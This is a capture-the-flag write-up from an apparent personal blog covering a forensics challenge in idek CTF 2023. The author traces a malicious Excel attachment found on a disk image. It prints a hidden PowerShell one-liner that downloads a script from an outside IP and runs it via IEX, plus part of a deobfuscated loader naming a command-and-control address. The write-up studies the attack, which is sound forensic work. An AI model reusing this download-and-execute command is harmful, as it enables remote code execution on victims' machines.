+++
author = "dree"
title = "idek CTF 2023"
date = "2023-01-24"
tags = [
    "OSINT", "Forensics"
]
+++

*Was in 2023, not 2022 since event delayed. Great CTF with a lot of challenges from the team **idek** ¯\_(ツ)_/¯. My team WolvSec came in **17th** out of **846** teams. I will be going over my 2 Forensics solves and 5 OSINT. Currently just Forensics 1, I plan to add the rest later!

<!--more-->

# HiddenGem Mixtape 1: Initial Access
Authors: `Bquanman`  
Points: **478**  
Solves: **47**

### Challenge Description:
We're pretty sure there's been a hack into our system. The incident is suspected to be caused by an employee opening a document file received via email even though he deleted it shortly afterwards. We managed to do a logical acquisition of data from his hard drive. However, when we open the document file, it looks empty, can you analyze what it contains?


### Approach

We are given a `.vhdx` file, which contains a Windows Image. To open in Autopsy, I double clicked the file on my Windows machine and imported that disk image. The first thing that struck my eye when doing this was the email saved onto the machine.

{{< img src="autopsyemail.png" >}}

The email HTML gives us the password `Privacy4411@2023!!!`. This can be used to open the attachment in the email, which gives us a file `Policy.xlsx`. In this file my teammates and I tried to find anything meaningful, even performing stego on the image of Tommy Xiaomi but with no success. I noticed a weird line on page 3, which was hidden, but it did not show correct output on google sheets since the file was converted. However, `doubledelete` was able to view the line
```
CMD.EXE /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"http://172.21.20.96/windowsupdate.ps1\");IEX $e
```
This can also be viewed on any.run when importing the file

{{< img src="anyrunoutput.png" >}}

This malicious command seems to have downloaded a file called `windowsupdate.ps1`. I searched this string in Autopsy, and found a command where a very long base64 string was downloaded from the Powershell logs. Decoding the b64 we an object that starts with:
```
(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL ' ', ('76492d111..)
```

We can run this into a powershell emulator to get the following output:

```
$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);
$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);
$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);
$s='172.21.20.96:8080';$i='eef8efac-321d465e-e9d053a7';
$p='http://';$v=Invoke-Web...
```

And there we see a `$flag` variable, signaling this is likely our flag. Running just that and printing we get a pastebin:

{{< img src="tiooutput.png" >}}

And we get the flag! As well as the resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within

flag: `sdctf{morning_noon_and_night_I_meme}`
